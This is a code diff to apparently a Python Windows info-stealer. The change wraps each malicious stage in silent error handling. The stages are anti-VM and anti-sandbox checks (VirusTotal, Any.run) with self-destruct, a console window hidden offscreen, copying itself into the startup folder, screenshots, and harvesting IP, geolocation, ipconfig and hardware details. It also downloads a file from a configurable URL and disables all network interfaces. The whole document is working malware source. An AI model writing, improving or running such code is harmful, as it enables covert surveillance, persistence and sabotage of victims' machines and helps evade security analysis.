@@ -165,29 +165,41 @@ def alert(type):
 
 while __name__ == "__main__":
     if anti_vm:
-        if anti.vm():
-            alert("VM")
-            time.sleep(5)
-            util.destruct()
-            exit()
+        try:
+            if anti.vm():
+                alert("VM")
+                time.sleep(5)
+                util.destruct()
+                exit()
+        except:
+            pass
 
     if anti_vt:
-        if anti.vt():
-            alert("Virus total")
-            time.sleep(5)
-            util.destruct()
-            exit()
+        try:
+            if anti.vt():
+                alert("Virus total")
+                time.sleep(5)
+                util.destruct()
+                exit()
+        except:
+            pass
 
     if anti_arun:
-        if anti.arun():
-            alert("Any.run")
-            time.sleep(5)
-            util.destruct()
-            exit()
+        try:
+            if anti.arun():
+                alert("Any.run")
+                time.sleep(5)
+                util.destruct()
+                exit()
+        except:
+            pass
 
     if hide:
-        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
-        ctypes.windll.user32.MoveWindow(hwnd, 50000, 500000, 800, 600, True)
+        try:
+            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
+            ctypes.windll.user32.MoveWindow(hwnd, 50000, 500000, 800, 600, True)
+        except:
+            pass
 
     folder_name = fr"C:\temp_{util.gen_str(5)}"
     os.mkdir(folder_name)
@@ -195,106 +207,126 @@ while __name__ == "__main__":
     send_embed()
 
     if startup:
-        shutil.copy(os.path.abspath(__file__), dir.startup)
+        try:
+            shutil.copy(os.path.abspath(__file__), dir.startup)
+        except:
+            pass
 
     if ss:
-        pyautogui.screenshot().save(f"{folder_name}/screen.png")
+        try:
+            pyautogui.screenshot().save(f"{folder_name}/screen.png")
+        except:
+            pass
 
     if con_info:
-        result = subprocess.run(['ipconfig', '/all'], capture_output=True, text=True)
-        if result.returncode == 0:
-            ipcfgdata = result.stdout
-        else:
-            ipcfgdata = "Failed to fetch"
-        r = requests.get("https://ipinfo.io/")
-        data = f"""
-ip: {r.json().get('ip')}
-hostname: {r.json().get('hostname')}
-city: {r.json().get('city')}
-region: {r.json().get('region')}
-country: {r.json().get('country')}
-location: {r.json().get('loc')}
-org: {r.json().get('org')}
-postal: {r.json().get('postal')}
-timezone: {r.json().get('timezone')}
+        try:
+            result = subprocess.run(['ipconfig', '/all'], capture_output=True, text=True)
+            if result.returncode == 0:
+                ipcfgdata = result.stdout
+            else:
+                ipcfgdata = "Failed to fetch"
+            r = requests.get("https://ipinfo.io/")
+            data = f"""
+    ip: {r.json().get('ip')}
+    hostname: {r.json().get('hostname')}
+    city: {r.json().get('city')}
+    region: {r.json().get('region')}
+    country: {r.json().get('country')}
+    location: {r.json().get('loc')}
+    org: {r.json().get('org')}
+    postal: {r.json().get('postal')}
+    timezone: {r.json().get('timezone')}
 
-$$$ --------------------------------------------- $$$
+    $$$ --------------------------------------------- $$$
 
-        {ipcfgdata}
-        """
-        with open(f"{folder_name}/connectioninfo.txt", "w") as f:
-            f.write(data)
-    
+            {ipcfgdata}
+            """
+            with open(f"{folder_name}/connectioninfo.txt", "w") as f:
+                f.write(data)
+        except:
+            pass
+
+
     if pc_info:
-        os.mkdir(f"{folder_name}/pcinfo")
-        system_info = f"""
-Main       
+        try:
+            os.mkdir(f"{folder_name}/pcinfo")
+            system_info = f"""
+    Main       
 
-System: {platform.system()},
-PC name: {platform.node()},
-Release: {platform.release()},
-Version: {platform.version()},
-        """
+    System: {platform.system()},
+    PC name: {platform.node()},
+    Release: {platform.release()},
+    Version: {platform.version()},
+            """
 
-        cpu_info = f"""
-CPU
+            cpu_info = f"""
+    CPU
 
-Processor: {platform.processor()}
-Architecture: {platform.architecture()[0]}
-Machine: {platform.machine()},
-Processor: {platform.processor()}
-        """
+    Processor: {platform.processor()}
+    Architecture: {platform.architecture()[0]}
+    Machine: {platform.machine()},
+    Processor: {platform.processor()}
+            """
 
-        ram_info = f"""
-RAM
+            ram_info = f"""
+    RAM
 
-Total Memory: {round(psutil.virtual_memory().total / (1024 ** 3), 2)} GB
-Available Memory: {round(psutil.virtual_memory().available / (1024 ** 3), 2)} GB
-        """
+    Total Memory: {round(psutil.virtual_memory().total / (1024 ** 3), 2)} GB
+    Available Memory: {round(psutil.virtual_memory().available / (1024 ** 3), 2)} GB
+            """
 
-        disk_info = f"""
-DISK
+            disk_info = f"""
+    DISK
 
-Total Disk Space: {round(psutil.disk_usage('/').total / (1024 ** 3), 2)} GB
-Used Disk Space: {round(psutil.disk_usage('/').used / (1024 ** 3), 2)} GB
-Free Disk Space: {round(psutil.disk_usage('/').free / (1024 ** 3), 2)} GB
-        """
+    Total Disk Space: {round(psutil.disk_usage('/').total / (1024 ** 3), 2)} GB
+    Used Disk Space: {round(psutil.disk_usage('/').used / (1024 ** 3), 2)} GB
+    Free Disk Space: {round(psutil.disk_usage('/').free / (1024 ** 3), 2)} GB
+            """
 
-        data = system_info + cpu_info + ram_info + disk_info
+            data = system_info + cpu_info + ram_info + disk_info
 
-        with open(f"{folder_name}/pcinfo/Specs.txt", "w") as f:
-            f.write(data)
+            with open(f"{folder_name}/pcinfo/Specs.txt", "w") as f:
+                f.write(data)
 
+        except:
+            pass
 
     if down_file:
-        down_file_path = ''
-        down_file_url = ''
-        r = requests.get(down_file_url)
-        r.raise_for_status()
-        with open(down_file_path, 'wb') as file:
-            file.write(r.content)
+        try:
+            down_file_path = ''
+            down_file_url = ''
+            r = requests.get(down_file_url)
+            r.raise_for_status()
+            with open(down_file_path, 'wb') as file:
+                file.write(r.content)
+        except:
+            pass
 
     if play_music:
-        url = ''
-        r = requests.get(url)
-        r.raise_for_status()
-        with open('C:/temp_music.mp3', 'wb') as file:
-            file.write(r.content)
+        try:
+            url = ''
+            r = requests.get(url)
+            r.raise_for_status()
+            with open('C:/temp_music.mp3', 'wb') as file:
+                file.write(r.content)
 
-        os.system("cls")
-        pygame.mixer.init()
-        pygame.mixer.music.load("C:/temp_music.mp3")
-        pygame.mixer.music.play()
-        while pygame.mixer.music.get_busy():
-            time.sleep(1)
+            os.system("cls")
+            pygame.mixer.init()
+            pygame.mixer.music.load("C:/temp_music.mp3")
+            pygame.mixer.music.play()
+            while pygame.mixer.music.get_busy():
+                time.sleep(1)
+        except:
+            pass
 
     if fuck_internet:
-        interface_names = list(psutil.net_if_stats().keys())
-        for name in interface_names:
-            os.system(f'netsh interface set interface name="{name}" admin=DISABLED')
+        try:
+            interface_names = list(psutil.net_if_stats().keys())
+            for name in interface_names:
+                os.system(f'netsh interface set interface name="{name}" admin=DISABLED')
+        except:
+            pass
 
-
-    input("END")
     shutil.rmtree(folder_name)
     if destruct:
         util.destruct()
